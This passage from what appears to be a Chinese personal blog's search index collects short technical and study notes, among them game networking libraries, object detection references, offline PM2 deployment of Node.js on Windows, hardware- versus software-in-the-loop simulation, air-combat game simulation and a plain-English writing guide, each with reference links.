<li><a href="https://blog.csdn.net/yanghui555/article/details/115356763" target="_blank" rel="noopener">程序中监听数据库变化的各种方法与实践</a>,by yanghui555.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏网络研究笔记</title>
    <url>/2022/11/14/%E6%B8%B8%E6%88%8F%E7%BD%91%E7%BB%9C%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="游戏网络库"><a href="#游戏网络库" class="headerlink" title="游戏网络库"></a>游戏网络库</h1><h2 id="C-C"><a href="#C-C" class="headerlink" title="C / C++"></a>C / C++</h2><ul>
<li>ENet - 简单而强大的可靠 UDP 网络库。</li>
<li>GameNetworkingSockets - Valve 用于游戏的内部（Steam）网络传输层。</li>
<li>GGPO - 好游戏，Peace Out 回滚网络 SDK。</li>
<li>KCP - 一种快速可靠的 ARQ 协议。</li>
<li>RakNet - 功能齐全且成熟可靠的 UDP 网络引擎。</li>
<li>TNL2 -（非活动）扭矩网络库 2，与TRIBES 网络模型非常相似。</li>
<li>yojimbo - 用于具有专用服务器的客户端/服务器游戏的可靠 UDP 网络库。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://pvigier.github.io/2019/09/08/beginner-guide-game-networking.html" target="_blank" rel="noopener">Beginner’s Guide to Game Networking</a>,by pvigier.</li>
<li><a href="https://github.com/ThusSpokeNomad/GameNetworkingResources" target="_blank" rel="noopener">GameNetworkingResources</a>,by ThusSpokeNomad.</li>
<li><a href="http://buildnewgames.com/real-time-multiplayer/" target="_blank" rel="noopener">Real Time Multiplayer in HTML5</a>,by Sven Bergström.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>C/C++</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>目标检测相关知识记录</title>
    <url>/2022/04/27/%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>目标检测任务是找出图像或视频中人们感兴趣的物体，并同时检测出它们的位置和大小。不同于图像分类任务，目标检测不仅要解决分类问题，还要解决定位问题，是属于Multi-Task的问题。</p>
<p>作为计算机视觉的基本问题之一，目标检测构成了许多其它视觉任务的基础，例如实例分割，图像标注和目标跟踪等等；从检测应用的角度看：行人检测、面部检测、文本检测、交通标注与红绿灯检测，遥感目标检测统称为目标检测的五大应用。</p>
<h1 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cvmart.net/community/detail/4992" target="_blank" rel="noopener">综述：目标检测二十年（2001-2021）</a>,by 派派星.</li>
<li><a href="https://blog.csdn.net/oYeZhou/article/details/116934793" target="_blank" rel="noopener">2021深度学习目标检测综述</a>,by 叶舟.</li>
<li><a href="https://www.cvmart.net/community/detail/655" target="_blank" rel="noopener">综述计算机视觉五大技术：图像分类、对象检测、目标跟踪、语义分割和实例分割</a>,by ExtremeMart.</li>
<li><a href="https://blog.csdn.net/Avery123123/article/details/106769742" target="_blank" rel="noopener">计算机视觉—–图像分类综述</a>,by Avery123123.</li>
<li><a href="https://blog.csdn.net/hunnzi/article/details/103445059" target="_blank" rel="noopener">红外图像数据集</a>,by hunnzi.</li>
<li><a href="https://zhuanlan.zhihu.com/p/340734934" target="_blank" rel="noopener">FLIR红外数据集踩坑总结</a>,by FLIR红外数据集踩坑总结.</li>
<li><a href="https://blog.csdn.net/zhengfei11/article/details/108072254" target="_blank" rel="noopener">轻型网络知识点</a>,by 飞翔的河马F.</li>
<li><a href="https://github.com/Sun-Yize-SDUWH/Deep-Learning-On-Raspberry-Pi-Zero" target="_blank" rel="noopener">树莓派zero图像分类与目标检测</a>,by 孙易泽 吴锦程 詹沛 徐潇涵.</li>
<li><a href="https://zhuanlan.zhihu.com/p/68151917" target="_blank" rel="noopener">（三十三）通俗易懂理解——SSD原理与实现</a>,by 梦里寻梦.</li>
<li><a href="https://cloud.tencent.com/developer/article/1544276" target="_blank" rel="noopener">YOLO目标检测从V1到V3结构详解</a>,by AI算法与图像处理.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32525231" target="_blank" rel="noopener">目标检测|YOLO原理与实现</a>,by 小小将.</li>
<li><a href="https://zhuanlan.zhihu.com/p/52661111" target="_blank" rel="noopener">深度学习目标检测系列：一文弄懂YOLO算法|附Python源码</a>,by 阿里云云栖号.</li>
<li><a href="https://zhuanlan.zhihu.com/p/65123312" target="_blank" rel="noopener">Stacked Hourglass Networks简析</a>,by TwiLight.</li>
<li><a href="https://zhuanlan.zhihu.com/p/338217417" target="_blank" rel="noopener">详解Region Proposal Network</a>,by 不认输的绿皮车.</li>
<li><a href="https://blog.csdn.net/qq_35586657/article/details/97956189" target="_blank" rel="noopener">RPN（Region Proposal Network）和 Anchor 理解</a>,by 梦星魂24.</li>
<li><a href="https://zhuanlan.zhihu.com/p/59376548" target="_blank" rel="noopener">CVPR2019目标检测方法进展综述</a>,by SIGAI.</li>
<li><a href="https://zhuanlan.zhihu.com/p/350610859" target="_blank" rel="noopener">重读 CenterNet，一个在Github有5.2K星标的目标检测算法</a>,by 忆臻.</li>
<li><a href="https://zhuanlan.zhihu.com/p/343805743" target="_blank" rel="noopener">centernet论文阅读笔记</a>,by 雾游.</li>
<li><a href="https://zhuanlan.zhihu.com/p/148738276" target="_blank" rel="noopener">一文看尽物体检测中的各种FPN</a>,by 小纸屑.</li>
<li><a href="https://dinghye.gitee.io/2020/10/31/Detectron2FPN/" target="_blank" rel="noopener">【深度学习】Faster-RCNN：1. 特征金字塔网络Feature Pyramid Network</a>,by dinghye.</li>
<li><a href="https://wxler.github.io/2020/11/24/214400/" target="_blank" rel="noopener">Batch Normalization：批量归一化详解</a>,by wxler.</li>
<li><a href="https://zhuanlan.zhihu.com/p/42706477" target="_blank" rel="noopener">详解残差网络</a>,by 大师兄.</li>
<li><a href="https://yinguobing.com/feature-pyramid-networks-for-object-detection/" target="_blank" rel="noopener">物体检测中的特征金字塔</a>,by 尹国冰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>科学研究的标准流程</title>
    <url>/2020/02/09/%E7%A7%91%E5%AD%A6%E7%A0%94%E7%A9%B6%E7%9A%84%E6%A0%87%E5%87%86%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>科学研究是每一个科研人必备的技能，那么科学研究应如何入手呢？通常科学研究应遵循如下标准流程：</p>
<h1 id="问题牵引"><a href="#问题牵引" class="headerlink" title="问题牵引"></a>问题牵引</h1><h2 id="形式化定义问题"><a href="#形式化定义问题" class="headerlink" title="形式化定义问题"></a>形式化定义问题</h2><h2 id="问题等价转换"><a href="#问题等价转换" class="headerlink" title="问题等价转换"></a>问题等价转换</h2><h1 id="建立模型"><a href="#建立模型" class="headerlink" title="建立模型"></a>建立模型</h1><h2 id="已有数学模型"><a href="#已有数学模型" class="headerlink" title="已有数学模型"></a>已有数学模型</h2><h2 id="类似数学模型"><a href="#类似数学模型" class="headerlink" title="类似数学模型"></a>类似数学模型</h2><h2 id="重建数学模型"><a href="#重建数学模型" class="headerlink" title="重建数学模型"></a>重建数学模型</h2><h1 id="模型求解"><a href="#模型求解" class="headerlink" title="模型求解"></a>模型求解</h1><h2 id="收集数据"><a href="#收集数据" class="headerlink" title="收集数据"></a>收集数据</h2><h2 id="求解模型"><a href="#求解模型" class="headerlink" title="求解模型"></a>求解模型</h2><h1 id="验证模型"><a href="#验证模型" class="headerlink" title="验证模型"></a>验证模型</h1><h2 id="模型预测"><a href="#模型预测" class="headerlink" title="模型预测"></a>模型预测</h2><h2 id="灵敏度分析"><a href="#灵敏度分析" class="headerlink" title="灵敏度分析"></a>灵敏度分析</h2>]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>感悟</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>离线环境下Node.js应用部署方法</title>
    <url>/2018/05/10/%E7%A6%BB%E7%BA%BF%E7%8E%AF%E5%A2%83%E4%B8%8BNode-js%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>离线环境下Node.js应用部署时需要解决以下三个基本问题：</p>
<ol>
<li>Node.js应用的进程管理，如性能监控、自动重启、负载均衡等</li>
<li>Node.js应用开机如何自启动</li>
<li>离线环境下如何部署Node.js应用</li>
</ol>
<p>下面以在Windows Server 2012上离线部署Node.js应用为例，记录上述问题的解决方案：</p>
<h1 id="Node-js应用的进程管理"><a href="#Node-js应用的进程管理" class="headerlink" title="Node.js应用的进程管理"></a>Node.js应用的进程管理</h1><p>在生产环境中运行 Express 应用程序时，使用进程管理器对于完成以下任务很有帮助<sup>[1]</sup>：</p>
<ul>
<li>在应用程序崩溃后将其重新启动。</li>
<li>获得对运行时性能和资源消耗的洞察。</li>
<li>动态修改设置以改善性能。</li>
<li>控制集群。</li>
</ul>
<p>进程管理器有点类似于应用程序服务器：它是应用程序的“容器”，可促进部署，提供高可用性并使您可以在运行时管理应用程序。</p>
<p>用于 Express 和其他 Node.js 应用程序的最流行的进程管理器包括：</p>
<ul>
<li>StrongLoop Process Manager</li>
<li>PM2</li>
<li>Forever</li>
</ul>
<p>上述三种工具的比较请参阅<a href="http://strong-pm.io/compare/" target="_blank" rel="noopener">http://strong-pm.io/compare/</a>。其中，StrongLoop Process Manager无法在Windows平台工作，再综合比较PM2和Forever，由于Forever没有操作系统自启动的脚本，故选择PM2作为Windows平台Node.js应用的进程管理器。</p>
<h1 id="Node-js应用开机如何自启动"><a href="#Node-js应用开机如何自启动" class="headerlink" title="Node.js应用开机如何自启动"></a>Node.js应用开机如何自启动</h1><p>选择PM2作为Node.js应用的进程管理器后，Node.js应用开机自启动的问题就变为如何开机自启动PM2。Windows平台存在两个自启动PM2的脚本：</p>
<ul>
<li>pm2-windows-service </li>
<li>pm2-windows-startup</li>
</ul>
<p>pm2-windows-service基于 node-windows将PM2注册为Windows服务，从而实现自启动。pm2-windows-startup则基于start-on-windows-boot在注册表中将PM2设为自启动程序，从而实现自启动。两种方案经测试，只有pm2-windows-startup在Windows Server 2012上可行，故选择pm2-windows-startup作为解决Node.js应用开机自启动的方案。</p>
<h1 id="离线环境下如何部署Node-js应用"><a href="#离线环境下如何部署Node-js应用" class="headerlink" title="离线环境下如何部署Node.js应用"></a>离线环境下如何部署Node.js应用</h1><p>PM2和pm2-windows-startup必须全局安装，如何简单方便地在离线环境下全局安装这两个模块是一个问题。网上搜到的方法有：</p>
<ul>
<li>npm link</li>
<li>npm-bundle</li>
</ul>
<p>npm link<sup>[2]</sup>是npm的一个命令，可将本地包链接成全局包，但实际测试过程中，无法解决PM2包的依赖问题，故放弃。而npm-bundle<sup>[3]</sup>则能很好的解决PM2的依赖问题。具体过程为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\在线环境下全局安装</span><br><span class="line">npm install -g pm2</span><br><span class="line">npm install -g pm2-windows-startup</span><br><span class="line">npm install -g npm-bundle</span><br><span class="line">npm-bundle pm2</span><br><span class="line">npm-bundle pm2-windows-startup</span><br></pre></td></tr></table></figure>

<h2 id="离线部署Nodejs-Express应用"><a href="#离线部署Nodejs-Express应用" class="headerlink" title="离线部署Nodejs Express应用"></a>离线部署Nodejs Express应用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">SET NODE_ENV&#x3D;production</span><br><span class="line">call npm install .\pm2-2.10.3.tgz -g </span><br><span class="line">call npm install .\pm2-windows-startup-1.0.3.tgz -g</span><br><span class="line">call pm2-startup install </span><br><span class="line">call pm2 start .&#x2F;bin&#x2F;www -i 0</span><br><span class="line">call pm2 save</span><br></pre></td></tr></table></figure>

<h2 id="离线卸载Nodejs-Express应用"><a href="#离线卸载Nodejs-Express应用" class="headerlink" title="离线卸载Nodejs Express应用"></a>离线卸载Nodejs Express应用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">call pm2 stop all</span><br><span class="line">call pm2-startup uninstall</span><br><span class="line">call npm uninstall pm2 -g</span><br><span class="line">call npm uninstall pm2-windows-startup -g</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="http://expressjs.com/zh-cn/advanced/pm.html" target="_blank" rel="noopener">Express 应用程序的进程管理器</a>, by Express</li>
<li><a href="https://blog.csdn.net/fay462298322/article/details/53432691" target="_blank" rel="noopener">npm离线安装全局包,内网安装npm中的包</a>, by 爱死费崇政</li>
<li><a href="https://stackoverflow.com/questions/41156556/what-exact-command-is-to-install-pm2-on-offline-rhel" target="_blank" rel="noopener">What exact command is to install pm2 on offline RHEL</a>, by stackoverflow.</li>
<li><a href="https://blog.cloudboost.io/nodejs-pm2-startup-on-windows-db0906328d75" target="_blank" rel="noopener">NodeJS: PM2 Startup on Windows</a>,by Walter Accantelli.</li>
<li><a href="https://blog.csdn.net/u010889616/article/details/78058006" target="_blank" rel="noopener">bat脚本%cd%和%~dp0获取当前目录区别</a>,by dmfrm</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>科学研究中阅读论文的方法</title>
    <url>/2018/12/20/%E7%A7%91%E5%AD%A6%E7%A0%94%E7%A9%B6%E4%B8%AD%E9%98%85%E8%AF%BB%E8%AE%BA%E6%96%87%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在科学研究的过程中，选题十分重要。因此在初步确定好选题方向后，应对该选题方向进行调研。调研的主要工作就是寻找该方向的论文，进行阅读、分析、总结，了解该方向的过去和现在，并预测未来可能的发展方向。对于刚上研究生的同学，该采用什么样的方法来整理选题方向上的论文，使之符合逻辑，并且条理清晰呢？偶尔拜读了Flood Sung写的文章”深度学习论文阅读路线图“，觉得深受启发，将其所提出的深度学习论文阅读路线图构建原则记录备忘一下。</p>
<h1 id="路线图的构建原则"><a href="#路线图的构建原则" class="headerlink" title="路线图的构建原则"></a>路线图的构建原则</h1><p>有以下四个原则：</p>
<ul>
<li>从整体到局部。即从Survey的文章，影响大局的文章到具体子问题子领域的文章。</li>
<li>从过去到最前沿。即每个topic的文章是按照时间顺序排列的，这样大家就可以清楚的看到这个方向的研究发展脉络。</li>
<li>从通用到应用。即有些深度学习的文章是面向深度学习通用理论，比如Resnet，可以用在任意的神经网络中，而有些文章则是具体应用，比如Image Caption。</li>
<li>面向最前沿。收集的文章会有很多是最新的，甚至就是几天前出来的，这样能保证路线图是最新的。</li>
</ul>
<p>每一种topic只选择最有代表性的几篇文章，比如深度增强学习（Deep Reinforcement Learning），这个领域现在有几十篇文章，但只选择几篇，要深入了解甚至做为自己的研究方向，还需要进一步的阅读该领域的文章。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/23080129" target="_blank" rel="noopener">深度学习论文阅读路线图 Deep Learning Papers Reading Roadmap</a>,by Flood Sung.</li>
<li><a href="https://github.com/floodsung/Deep-Learning-Papers-Reading-Roadmap" target="_blank" rel="noopener">Deep Learning Papers Reading Roadmap</a>,by Flood Sung.</li>
<li><a href="https://blog.csdn.net/qianlong4526888/article/details/11269129" target="_blank" rel="noopener">【How to read a paper】如何读论文</a>,by 乾龙_Heron.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>硬件在环与软件在环概念辨析</title>
    <url>/2019/04/25/%E7%A1%AC%E4%BB%B6%E5%9C%A8%E7%8E%AF%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%9C%A8%E7%8E%AF%E6%A6%82%E5%BF%B5%E8%BE%A8%E6%9E%90/</url>
    <content><![CDATA[<p>在PX4自驾仪软件的二次开发过程中，涉及硬件在环与软件在环两个概念，不易理解。下面对这两个概念进行辨析。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="硬件在环"><a href="#硬件在环" class="headerlink" title="硬件在环"></a>硬件在环</h2><p>硬件在环（Hardware in the Loop，简称HIL）即硬件在控制环路，是一种半实物仿真。根据控制器和控制对象是否为真实硬件，分为以下两种硬件在环方式：</p>
<ul>
<li>虚拟控制器+实际对象=快速控制原型(RCP)仿真系统，是系统的一种半实物仿真；</li>
<li>实际控制器+虚拟对象=硬件在回路(HIL)仿真系统，是系统的另一种半实物仿真。</li>
</ul>
<p>硬件在环主要用于测试控制器系统。</p>
<h2 id="软件在环"><a href="#软件在环" class="headerlink" title="软件在环"></a>软件在环</h2><p>软件在环主要测试控制器模型与控制器模型代码实现之间的一致性。</p>
<h2 id="处理器在环"><a href="#处理器在环" class="headerlink" title="处理器在环"></a>处理器在环</h2><p>软件在环主要测试控制器模型与控制器模型代码实现在目标处理器上运行之间的一致性。</p>
<h2 id="模型在环"><a href="#模型在环" class="headerlink" title="模型在环"></a>模型在环</h2><p>模型在环（Model in the Loop，简称MIL）是用模型驱动进行嵌入式系统的开发时，在开发阶段初期及建模阶段中进行的仿真方式。嵌入式系统需和其运作的环境互动，一般会预期有合理的传感器信号为其输入，也会依输入及系统设计来驱动实体系统。为了使系统正常工作，需要将嵌入式系统的环境纳入仿真考量范围内。若嵌入式系统模型和环境模型连接，一起进行仿真，则即称为模型在环模拟。</p>
<p>模型在环主要用于测试控制算法，其控制器模型和控制器对象都是虚拟的。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/32069347" target="_blank" rel="noopener">请明白人通俗的解释一下什么叫硬件在环？</a>, by zhihu.</li>
<li><a href="http://www.360doc.com/content/16/0908/10/22368478_589256146.shtml" target="_blank" rel="noopener">简单说说MIL、SIL、PIL和HIL</a>, by Wangxn665.</li>
<li><a href="https://zh.wikipedia.org/wiki/模型在环" target="_blank" rel="noopener">模型在环</a>, by wikipedia.</li>
<li><a href="https://baike.baidu.com/item/硬件在环" target="_blank" rel="noopener">硬件在环</a>, by 百度百科.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>空战类游戏仿真的一些思考</title>
    <url>/2018/12/08/%E7%A9%BA%E6%88%98%E7%B1%BB%E6%B8%B8%E6%88%8F%E4%BB%BF%E7%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>空战类游戏仿真涉及飞机、导弹、诱饵弹三种关键元素。为了使游戏仿真接近真实，一方面要使飞机、导弹、诱饵弹的模型及其特效（如尾焰）尽量逼真，另一方面要使飞机、导弹、诱饵弹的运动控制模型尽量接近真实。飞机、导弹、诱饵弹的模型可以用3d建模软件构建，尾焰也可以用粒子系统进行模拟，但飞机、导弹、诱饵弹的运动控制模型比较复杂，是实现空战类游戏仿真的关键。下面分别介绍飞机、导弹、诱饵弹的建模仿真。</p>
<h1 id="飞机的建模仿真"><a href="#飞机的建模仿真" class="headerlink" title="飞机的建模仿真"></a>飞机的建模仿真</h1><p>飞机的运动模型基于牛顿第二运动定律，即物体所受到的外力等于此物体的质量与加速度的乘积，而加速度与外力同方向。根据外部受力和力矩计算出各种惯性坐标系下的加速度和角加速度。将加速度和角加速度分别进行积分，则可以得出飞机在某个时间段内的速度变化量和角速度变化量，进一步积分便可得到位置变化量和角度的变化量，再通过积分过程中的坐标变换以及初始时刻的状态参数，便可获得任意时刻飞机的姿态、位置、速度等参数。</p>
<p>飞行员通过油门杆和操纵杆控制飞机的运动。油门杆决定飞机的推力，操纵杆则控制飞机的副翼、襟翼、尾翼，改变飞机所受合力矩，从而改变飞机姿态。飞行仿真采用同样原理，油门杆和操作杆的位移经过非线性函数变换改变飞机所受合力和合力矩，经飞机运动模型获得加速度和角加速度，再经积分获得任意时刻飞机的姿态、位置、速度等参数。</p>
<p>当使用键盘输入控制飞机时，应将键盘输入先虚拟成油门杆和操作杆。另外需要注意的是，油门杆不回中，操作杆则自动回中。</p>
<h1 id="导弹的建模仿真"><a href="#导弹的建模仿真" class="headerlink" title="导弹的建模仿真"></a>导弹的建模仿真</h1><p>根据导弹的工作原理，导弹的建模仿真应分成三个方面：</p>
<ul>
<li>探测模型</li>
<li>目标识别算法</li>
<li>运动控制模型</li>
</ul>
<h1 id="诱饵弹的建模仿真"><a href="#诱饵弹的建模仿真" class="headerlink" title="诱饵弹的建模仿真"></a>诱饵弹的建模仿真</h1><p>诱饵弹的运动模型比较简单，可运用牛顿第二运动定律分析得出。比较有难度的是诱饵弹的视觉特效建模。诱饵弹是一个变质量、不规则的发光体，如何3D建模有难度，不能像太阳一样直接用图片代替。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/23722074" target="_blank" rel="noopener">无人机飞控通俗演义之 纷繁复杂的飞行力学</a>, by 量子黑洞.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25150076" target="_blank" rel="noopener">一起写飞行仿真之 六自由度动力学方程</a>, by 量子黑洞.</li>
<li><a href="https://zhuanlan.zhihu.com/p/34555581" target="_blank" rel="noopener">飞行仿真–1.三维建模篇</a>, by WFYX.</li>
<li><a href="https://zhuanlan.zhihu.com/p/23788458" target="_blank" rel="noopener">无人机飞控通俗演义之 无人机导航制导与控制</a>, by WFYX.</li>
<li><a href="http://home.flightgear.org/" target="_blank" rel="noopener">FLIGHTGEAR FLIGHT SIMULATOR</a>, by flightgear.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>科技论文写作技巧</title>
    <url>/2021/08/04/%E7%A7%91%E6%8A%80%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>科技论文文本结构通常由标题、作者、摘要、关键词、引言、方法、结果、讨论、结论等部分组成。下面总结记录各部分写作方法。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://baike.baidu.com/item/%E7%A7%91%E6%8A%80%E8%AE%BA%E6%96%87/1386279" target="_blank" rel="noopener">科技论文</a>,by 百度百科.</li>
<li><a href="https://www.sohu.com/a/398796116_120462441" target="_blank" rel="noopener">科技论文的引言怎么写 </a>,by PaperPP论文查重.</li>
<li><a href="https://www.163.com/dy/article/GM45VA95053849LA.html" target="_blank" rel="noopener">论文中Conclusion写作的几大要点，附有实例指导、写作模板</a>,by 美辑编译.</li>
<li><a href="https://zhuanlan.zhihu.com/p/488077632" target="_blank" rel="noopener">科技论文的结论如何写作？</a>,by 第2导师.</li>
<li><a href="https://new.qq.com/omn/20210311/20210311A01WAJ00.html" target="_blank" rel="noopener">编辑视角下，论文摘要、引言、结论怎么写？</a>,by qq.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>空战战术集锦</title>
    <url>/2021/08/06/%E7%A9%BA%E6%88%98%E6%88%98%E6%9C%AF%E9%9B%86%E9%94%A6/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/28503408" target="_blank" rel="noopener">超视距空战初探</a>,by 殇璃魂.</li>
<li><a href="https://www.bilibili.com/read/cv230676" target="_blank" rel="noopener">战争雷霆空战入门进阶教程 空战机动战术详解【1】</a>,by 大眼小乌贼.</li>
<li><a href="https://zhuanlan.zhihu.com/p/58592413" target="_blank" rel="noopener">超视距空战的发展及其局限性</a>,by 新浪军事.</li>
<li><a href="https://zhuanlan.zhihu.com/p/311895620" target="_blank" rel="noopener">击剑云端——现代超视距空战基本动作详解</a>,by 万年炎帝.</li>
<li><a href="https://baike.baidu.com/tashuo/browse/content?id=427d0d5ae5c4d5c9065bcc4b" target="_blank" rel="noopener">不懂这些基本的战机作战技能，别说你是空战迷！</a>,by 军武.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>简单英语写作方法</title>
    <url>/2020/09/04/%E7%AE%80%E5%8D%95%E8%8B%B1%E8%AF%AD%E5%86%99%E4%BD%9C%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>This guide begins with an introduction called, ‘So what’s plain English?’</p>
<p>The guide then looks at the main ways to make writing clearer.</p>
<ul>
<li>Keep your sentences short</li>
<li>Prefer active verbs</li>
<li>Use ‘you’ and ‘we’</li>
<li>Use words that are appropriate for the reader</li>
<li>Don’t be afraid to give instructions</li>
<li>Avoid nominalisations</li>
<li>Use lists where appropriate</li>
</ul>
<p>The guide then looks at the difficult subject of apologising, and deals with some of the myths that can get in the way of clear communication.</p>
<p>The guide finishes with a summary and a list of words to avoid.</p>
<h1 id="什么是简单英语"><a href="#什么是简单英语" class="headerlink" title="什么是简单英语"></a>什么是简单英语</h1><p>First let’s say what plain English isn’t and destroy some of the myths about it.</p>
<ul>
<li>It’s not ‘cat sat on the mat’ or ‘Janet and John’ writing. Almost anything - from leaflets and letters to legal documents - can be written in plain English without being patronising or oversimplified.</li>
<li>It doesn’t mean reducing the length of your message or changing its meaning. Most of the UK’s biggest insurance companies produce policies that explain everything fully in plain English.</li>
<li>It’s not about banning new words, killing off long words or promoting completely perfect grammar. Nor is it about letting grammar slip.</li>
<li>It is not an amateur’s method of communication. Most forward-looking senior managers always write in plain English.<br>And finally, it is not as easy as we would like to think.</li>
</ul>
<h1 id="句子尽量短"><a href="#句子尽量短" class="headerlink" title="句子尽量短"></a>句子尽量短</h1><p>Most experts would agree that clear writing should have an average sentence length of 15 to 20 words.</p>
<h1 id="使用主动语态"><a href="#使用主动语态" class="headerlink" title="使用主动语态"></a>使用主动语态</h1><p>Do you want your letters to sound active or passive - crisp and professional or stuffy and bureaucratic?</p>
<h1 id="合适使用被动语态"><a href="#合适使用被动语态" class="headerlink" title="合适使用被动语态"></a>合适使用被动语态</h1><p>There are times of course when it might be appropriate to use a passive.</p>
<ul>
<li>To make something less hostile - ‘this bill has not been paid’ (passive) is softer than ‘you have not paid this bill’ (active).</li>
<li>To avoid taking the blame - ‘a mistake was made’ (passive) rather than ‘we made a mistake’ (active).</li>
<li>When you don’t know who or what the doer is - ‘the England team has been picked’.</li>
<li>If it simply sounds better.</li>
</ul>
<h1 id="使用你们和我们"><a href="#使用你们和我们" class="headerlink" title="使用你们和我们"></a>使用你们和我们</h1><p>Try to call the reader ‘you’, even if the reader is only one of many people you are talking about generally. If this feels wrong at first, remember that you wouldn’t use words like ‘the applicant’ and ‘the supplier’ if you were speaking to somebody sitting across a desk from you.</p>
<h1 id="使用适合读者的字词"><a href="#使用适合读者的字词" class="headerlink" title="使用适合读者的字词"></a>使用适合读者的字词</h1><p>When you are talking to your reader, say exactly what you mean, using the simplest words that fit. This does not necessarily mean only using simple words - just words that the reader will understand.</p>
<p>At the end of this guide there is a list of a few of the words that we suggest you avoid. But for most words you will have to decide yourself whether they are suitable.</p>
<p>Jargon is a type of language that is only understood by a particular group of people. You can use jargon when writing to people who will understand the terms and phrases. It can be a useful form of shorthand. But try to avoid using specialist jargon on the general public.</p>
<p>So in general, keep to everyday English whenever possible. And again, imagine talking to your reader across a table.</p>
<h1 id="不用担心使用祈使句"><a href="#不用担心使用祈使句" class="headerlink" title="不用担心使用祈使句"></a>不用担心使用祈使句</h1><p>Sit!</p>
<p>Brush your teeth.</p>
<p>Please send it to me.</p>
<p>These are all commands - officially called imperatives. They are the fastest and most direct way of giving someone instructions.</p>
<p>However, if we asked a hardened bureaucrat to write these expressions, we would end up with something like the following.</p>
<h1 id="避免使用名词"><a href="#避免使用名词" class="headerlink" title="避免使用名词"></a>避免使用名词</h1><p>A nominalisation is a type of abstract noun. (Is that plain English?) In other words, it is the name of something that isn’t a physical object, such as a process, technique or emotion.</p>
<p>Nominalisations are formed from verbs.</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.plainenglish.co.uk/how-to-write-in-plain-english.html" target="_blank" rel="noopener">How to write in plain English</a>,by plainenglish.</li>
<li><a href="https://www.zhihu.com/question/41678611" target="_blank" rel="noopener">英语中表达并列，and前加不加逗号？</a>,by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/46736877" target="_blank" rel="noopener">英文中关于逗号使用方法</a>,by 桃子爱不完.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%8B%80%E8%AA%9E" target="_blank" rel="noopener">状语</a>,by wikipedia.</li>
<li><a href="https://www.dashanedu.com/zxzx/1491.html" target="_blank" rel="noopener">英语动名词作定语的用法形式有哪些</a>,by 大山教育.</li>
<li><a href="https://yz.chsi.com.cn/kyzx/en/201711/20171113/1640341585.html" target="_blank" rel="noopener">考研英语：英语语法中只有三大从句</a>,by yanzhaowang.</li>
